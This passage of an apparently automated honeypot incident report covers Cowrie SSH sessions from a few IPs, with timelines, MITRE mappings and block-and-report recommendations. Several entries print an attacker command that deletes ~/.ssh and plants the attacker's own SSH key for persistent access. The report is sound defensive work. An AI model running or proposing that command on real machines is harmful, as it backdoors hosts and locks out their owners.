| `2026-06-02 16:05:38` | `cowrie.command.failed` |
| `2026-06-02 16:05:39` | `cowrie.log.closed` |
| `2026-06-02 16:05:39` | `cowrie.session.params` |
| `2026-06-02 16:05:39` | `cowrie.command.input` |
| `2026-06-02 16:05:39` | `cowrie.session.file_download` |
| `2026-06-02 16:05:39` | `cowrie.log.closed` |
| `2026-06-02 16:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3f09080bc7

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:05 |
| **Last Seen** | 2026-06-02 16:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:05:41` | `cowrie.session.connect` |
| `2026-06-02 16:05:41` | `cowrie.client.version` |
| `2026-06-02 16:05:41` | `cowrie.client.kex` |
| `2026-06-02 16:05:42` | `cowrie.login.success` |
| `2026-06-02 16:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0fc869f9bb

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:06 |
| **Last Seen** | 2026-06-02 16:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:06:18` | `cowrie.session.connect` |
| `2026-06-02 16:06:18` | `cowrie.client.version` |
| `2026-06-02 16:06:18` | `cowrie.client.kex` |
| `2026-06-02 16:06:19` | `cowrie.login.success` |
| `2026-06-02 16:06:20` | `cowrie.session.params` |
| `2026-06-02 16:06:20` | `cowrie.command.input` |
| `2026-06-02 16:06:20` | `cowrie.command.failed` |
| `2026-06-02 16:06:20` | `cowrie.log.closed` |
| `2026-06-02 16:06:20` | `cowrie.session.params` |
| `2026-06-02 16:06:20` | `cowrie.command.input` |
| `2026-06-02 16:06:20` | `cowrie.session.file_download` |
| `2026-06-02 16:06:20` | `cowrie.log.closed` |
| `2026-06-02 16:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89c1913eeb2b

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:06 |
| **Last Seen** | 2026-06-02 16:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:06:23` | `cowrie.session.connect` |
| `2026-06-02 16:06:23` | `cowrie.client.version` |
| `2026-06-02 16:06:23` | `cowrie.client.kex` |
| `2026-06-02 16:06:24` | `cowrie.login.success` |
| `2026-06-02 16:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a621a56b78e

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-06-02 16:07 |
| **Last Seen** | 2026-06-02 16:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:07:03` | `cowrie.session.connect` |
| `2026-06-02 16:07:03` | `cowrie.client.version` |
| `2026-06-02 16:07:03` | `cowrie.client.kex` |
| `2026-06-02 16:07:03` | `cowrie.login.success` |
| `2026-06-02 16:07:04` | `cowrie.session.params` |
| `2026-06-02 16:07:04` | `cowrie.command.input` |
| `2026-06-02 16:07:04` | `cowrie.command.failed` |
| `2026-06-02 16:07:04` | `cowrie.log.closed` |
| `2026-06-02 16:07:04` | `cowrie.session.params` |
| `2026-06-02 16:07:04` | `cowrie.command.input` |
| `2026-06-02 16:07:04` | `cowrie.session.file_download` |
| `2026-06-02 16:07:04` | `cowrie.log.closed` |
| `2026-06-02 16:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1016dd7a6c28

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-06-02 16:07 |
| **Last Seen** | 2026-06-02 16:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:07:06` | `cowrie.session.connect` |
| `2026-06-02 16:07:06` | `cowrie.client.version` |
| `2026-06-02 16:07:06` | `cowrie.client.kex` |
| `2026-06-02 16:07:07` | `cowrie.login.success` |
| `2026-06-02 16:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afeb0911af68

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:07 |
| **Last Seen** | 2026-06-02 16:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:07:08` | `cowrie.session.connect` |
| `2026-06-02 16:07:08` | `cowrie.client.version` |
| `2026-06-02 16:07:08` | `cowrie.client.kex` |
| `2026-06-02 16:07:09` | `cowrie.login.success` |
| `2026-06-02 16:07:09` | `cowrie.session.params` |
| `2026-06-02 16:07:09` | `cowrie.command.input` |
| `2026-06-02 16:07:09` | `cowrie.command.failed` |
| `2026-06-02 16:07:10` | `cowrie.log.closed` |
| `2026-06-02 16:07:10` | `cowrie.session.params` |
| `2026-06-02 16:07:10` | `cowrie.command.input` |
| `2026-06-02 16:07:10` | `cowrie.session.file_download` |
| `2026-06-02 16:07:10` | `cowrie.log.closed` |
| `2026-06-02 16:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-066b02274000

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:07 |
| **Last Seen** | 2026-06-02 16:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:07:12` | `cowrie.session.connect` |
| `2026-06-02 16:07:12` | `cowrie.client.version` |
| `2026-06-02 16:07:12` | `cowrie.client.kex` |
| `2026-06-02 16:07:13` | `cowrie.login.success` |
| `2026-06-02 16:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d87ddc97ab

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 16:07 |
| **Last Seen** | 2026-06-02 16:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:07:17` | `cowrie.session.connect` |
| `2026-06-02 16:07:17` | `cowrie.client.version` |
| `2026-06-02 16:07:17` | `cowrie.client.kex` |
| `2026-06-02 16:07:18` | `cowrie.login.success` |
| `2026-06-02 16:07:18` | `cowrie.session.params` |
| `2026-06-02 16:07:18` | `cowrie.command.input` |
| `2026-06-02 16:07:18` | `cowrie.command.failed` |
| `2026-06-02 16:07:19` | `cowrie.log.closed` |
| `2026-06-02 16:07:19` | `cowrie.session.params` |
| `2026-06-02 16:07:19` | `cowrie.command.input` |
| `2026-06-02 16:07:19` | `cowrie.session.file_download` |
| `2026-06-02 16:07:19` | `cowrie.log.closed` |
| `2026-06-02 16:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf3df5edbb92

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 16:07 |
| **Last Seen** | 2026-06-02 16:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:07:21` | `cowrie.session.connect` |
| `2026-06-02 16:07:21` | `cowrie.client.version` |
| `2026-06-02 16:07:21` | `cowrie.client.kex` |
| `2026-06-02 16:07:22` | `cowrie.login.success` |
| `2026-06-02 16:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e952487afe2

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:08 |
| **Last Seen** | 2026-06-02 16:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:08:01` | `cowrie.session.connect` |
| `2026-06-02 16:08:01` | `cowrie.client.version` |
| `2026-06-02 16:08:01` | `cowrie.client.kex` |
| `2026-06-02 16:08:02` | `cowrie.login.success` |
| `2026-06-02 16:08:03` | `cowrie.session.params` |
| `2026-06-02 16:08:03` | `cowrie.command.input` |
| `2026-06-02 16:08:03` | `cowrie.command.failed` |
| `2026-06-02 16:08:03` | `cowrie.log.closed` |
| `2026-06-02 16:08:03` | `cowrie.session.params` |
| `2026-06-02 16:08:03` | `cowrie.command.input` |
| `2026-06-02 16:08:03` | `cowrie.session.file_download` |
| `2026-06-02 16:08:03` | `cowrie.log.closed` |
| `2026-06-02 16:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e309e5fc86

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:08 |
| **Last Seen** | 2026-06-02 16:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:08:06` | `cowrie.session.connect` |
| `2026-06-02 16:08:06` | `cowrie.client.version` |
| `2026-06-02 16:08:06` | `cowrie.client.kex` |
| `2026-06-02 16:08:07` | `cowrie.login.success` |
| `2026-06-02 16:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f579cc9ac63d

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:08 |
| **Last Seen** | 2026-06-02 16:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:08:32` | `cowrie.session.connect` |
| `2026-06-02 16:08:32` | `cowrie.client.version` |
| `2026-06-02 16:08:32` | `cowrie.client.kex` |
| `2026-06-02 16:08:33` | `cowrie.login.success` |
| `2026-06-02 16:08:33` | `cowrie.session.params` |
| `2026-06-02 16:08:33` | `cowrie.command.input` |
| `2026-06-02 16:08:33` | `cowrie.command.failed` |
| `2026-06-02 16:08:33` | `cowrie.log.closed` |
| `2026-06-02 16:08:33` | `cowrie.session.params` |
| `2026-06-02 16:08:33` | `cowrie.command.input` |
| `2026-06-02 16:08:33` | `cowrie.session.file_download` |
| `2026-06-02 16:08:33` | `cowrie.log.closed` |
| `2026-06-02 16:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13e8c0e473e6

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:08 |
| **Last Seen** | 2026-06-02 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:08:35` | `cowrie.session.connect` |
| `2026-06-02 16:08:35` | `cowrie.client.version` |
| `2026-06-02 16:08:36` | `cowrie.client.kex` |
| `2026-06-02 16:08:36` | `cowrie.login.success` |
| `2026-06-02 16:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec77030cfc9d

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 16:08 |
| **Last Seen** | 2026-06-02 16:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:08:47` | `cowrie.session.connect` |
| `2026-06-02 16:08:47` | `cowrie.client.version` |
| `2026-06-02 16:08:48` | `cowrie.client.kex` |
| `2026-06-02 16:08:48` | `cowrie.login.success` |
| `2026-06-02 16:08:48` | `cowrie.session.params` |
| `2026-06-02 16:08:48` | `cowrie.command.input` |
| `2026-06-02 16:08:48` | `cowrie.command.failed` |
| `2026-06-02 16:08:49` | `cowrie.log.closed` |
| `2026-06-02 16:08:49` | `cowrie.session.params` |
| `2026-06-02 16:08:49` | `cowrie.command.input` |
| `2026-06-02 16:08:49` | `cowrie.session.file_download` |
| `2026-06-02 16:08:49` | `cowrie.log.closed` |
| `2026-06-02 16:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf6993962da

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 16:08 |
| **Last Seen** | 2026-06-02 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:08:51` | `cowrie.session.connect` |
| `2026-06-02 16:08:51` | `cowrie.client.version` |
| `2026-06-02 16:08:51` | `cowrie.client.kex` |
| `2026-06-02 16:08:52` | `cowrie.login.success` |
| `2026-06-02 16:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d2c39dbbbb4

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:09 |
| **Last Seen** | 2026-06-02 16:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:09:55` | `cowrie.session.connect` |
| `2026-06-02 16:09:55` | `cowrie.client.version` |
| `2026-06-02 16:09:55` | `cowrie.client.kex` |
| `2026-06-02 16:09:56` | `cowrie.login.success` |
| `2026-06-02 16:09:56` | `cowrie.session.params` |
| `2026-06-02 16:09:56` | `cowrie.command.input` |
| `2026-06-02 16:09:56` | `cowrie.command.failed` |
| `2026-06-02 16:09:56` | `cowrie.log.closed` |
| `2026-06-02 16:09:56` | `cowrie.session.params` |
| `2026-06-02 16:09:56` | `cowrie.command.input` |
| `2026-06-02 16:09:56` | `cowrie.session.file_download` |
| `2026-06-02 16:09:56` | `cowrie.log.closed` |
| `2026-06-02 16:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b48bd043f69

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:09 |
| **Last Seen** | 2026-06-02 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:09:58` | `cowrie.session.connect` |
| `2026-06-02 16:09:58` | `cowrie.client.version` |
| `2026-06-02 16:09:59` | `cowrie.client.kex` |
| `2026-06-02 16:09:59` | `cowrie.login.success` |
| `2026-06-02 16:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-752685246c2c

